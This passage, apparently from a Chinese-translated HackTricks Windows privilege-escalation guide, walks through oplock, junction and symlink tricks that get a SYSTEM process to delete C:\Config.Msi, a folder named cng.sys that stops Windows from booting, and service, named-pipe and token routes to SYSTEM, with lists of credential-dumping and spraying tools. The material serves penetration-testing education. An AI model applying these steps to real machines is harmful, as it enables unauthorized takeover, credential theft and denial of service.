    - 将你的 `.rbf` DLL 复制到目标位置。
  - 现在你的**恶意 DLL 位于一个由 SYSTEM 加载的路径**中。

- Final Step: Execute SYSTEM Code
  - 运行一个受信任的**auto-elevated binary**（例如 `osk.exe`），该二进制会加载你劫持的 DLL。
  - **Boom**：你的代码以 **SYSTEM** 身份执行。

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

主要的 MSI rollback 技术（前述方法）假设你可以删除整个文件夹（例如 `C:\Config.Msi`）。但如果你的漏洞仅允许**任意文件删除**怎么办？

你可以利用 NTFS 内部机制：每个文件夹都有一个隐藏的替代数据流（alternate data stream），称为：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
该数据流存储该文件夹的 **索引元数据**。

因此，如果你**删除文件夹的 `::$INDEX_ALLOCATION` 数据流**，NTFS 会**从文件系统中移除整个文件夹**。

你可以使用标准的文件删除 APIs，例如：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你调用的是 *file* delete API，它**删除文件夹本身**。

### 从删除文件夹内容到 SYSTEM EoP
如果你的 primitive 不允许你删除任意文件/文件夹，但它**确实允许删除攻击者控制的文件夹的*内容***？

1. 步骤 1：设置诱饵文件夹和文件
- 创建：`C:\temp\folder1`
- 在其中：`C:\temp\folder1\file1.txt`

2. 步骤 2：在 `file1.txt` 上放置一个 **oplock**
- 该 oplock 会在有特权的进程尝试删除 `file1.txt` 时**暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 第3步：触发 SYSTEM 进程（例如，`SilentCleanup`）
- 该进程会扫描文件夹（例如，`%TEMP%`）并尝试删除其中的内容。
- 当它处理到 `file1.txt` 时，**oplock 触发** 并将控制权交给你的回调。

4. 第4步：在 oplock 回调内 — 重定向删除

- 选项 A：将 `file1.txt` 移到别处
- 这样会清空 `folder1`，不会破坏 oplock。
- 不要直接删除 `file1.txt` — 那会过早释放 oplock。

- 选项 B：将 `folder1` 转换为 **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C：在 `\RPC Control` 中创建 **symlink**：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这会针对 NTFS 的内部流，该流用于存储文件夹元数据 — 删除它会删除该文件夹。

5. 第 5 步：释放 oplock
- SYSTEM 进程继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际上在删除：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**: `C:\Config.Msi` 被 SYSTEM 删除。

### 从 Arbitrary Folder Create 到 Permanent DoS

利用一个原语，允许你 **create an arbitrary folder as SYSTEM/admin** —  即使 **you can’t write files** 或 **set weak permissions**。

创建一个**folder**（不是 **file**），取名为一个**critical Windows driver**，例如：
```
C:\Windows\System32\cng.sys
```
- 此路径通常对应于 `cng.sys` 内核模式驱动程序。
- 如果你 **事先将其创建为文件夹**，Windows 在启动时无法加载实际驱动程序。
- 随后，Windows 在启动时尝试加载 `cng.sys`。
- 它会看到该文件夹，**无法定位实际驱动程序**，并且**崩溃或停止启动**。
- 没有**回退机制**，且在没有外部干预（例如引导修复或磁盘访问）的情况下**无法恢复**。


## **从 High Integrity 到 System**

### **新服务**

如果你已经在 High Integrity 进程上运行，**通往 SYSTEM 的路径**可能很简单，只需**创建并执行一个新服务**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 在创建 service binary 时，确保它是一个有效的 service，或者该 binary 能尽快执行必要操作，因为如果不是有效 service，它将在 20s 内被终止。

### AlwaysInstallElevated

从 High Integrity 进程你可以尝试 **启用 AlwaysInstallElevated 注册表项** 并使用 _**.msi**_ 包装器 **install** 一个 reverse shell。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**你可以** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有这些 token privileges（通常会在已经是 High Integrity 的进程中发现），你将能够使用 SeDebug privilege **open almost any process**（非 protected processes），**copy the token** 该进程，并使用该 token **create an arbitrary process**。\
使用此技术通常会 **选择任一以 SYSTEM 运行且具有所有 token privileges 的进程**（_是的，你可以找到没有所有 token privileges 的 SYSTEM 进程_）。\
**你可以找到** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

该技术被 meterpreter 用于 getsystem 提权。该技术包含 **创建一个 pipe，然后创建/滥用一个 service 向该 pipe 写入**。接着，使用 **`SeImpersonate`** privilege 创建该 pipe 的 **server** 将能够 **impersonate the token** 管道客户端（即 service）从而获取 SYSTEM privileges。\
如果你想要 [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)。\
如果你想阅读一个从 high integrity 到 System 使用 name pipes 的示例，请看 [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果你设法 **hijack a dll** 被以 **SYSTEM** 身份运行的 **process** **loaded**，你将能够以这些权限执行任意代码。因此 Dll Hijacking 对此类权限提升也很有用，而且从 high integrity 进程实现要容易得多，因为它对用于加载 dll 的文件夹具有 **write permissions**。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查 misconfigurations 和 sensitive files（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的 misconfigurations 并收集信息（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查 misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY, WinSCP, SuperPuTTY, FileZilla 和 RDP 已保存的会话信息。在本地使用 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 提取 crendentials。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在域内对收集到的密码进行 spray**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个 PowerShell ADIDNS/LLMNR/mDNS/NBNS 欺骗和中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的 Windows privesc 枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 搜索已知的 privesc 漏洞（已被 Watson 取代，DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **(需要 Admin 权限)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的 privesc 漏洞（需要使用 VisualStudio 编译）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找 misconfigurations（更偏信息收集工具而非纯 privesc）（需要编译）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从大量软件中提取凭据（github 上有预编译 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp 的 C# 移植**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 检查 misconfiguration（可执行文件已在 github 上预编译）。不推荐。它在 Win10 上表现不佳。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的 misconfigurations（python 打包为 exe）。不推荐。它在 Win10 上表现不佳。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 基于该帖子创建的工具（不需要 accesschk 也能正常工作，但可以使用它）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用 exploit（本地 python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用 exploit（本地 python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你必须使用正确版本的 .NET 来编译该项目（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上已安装的 .NET 版本，你可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
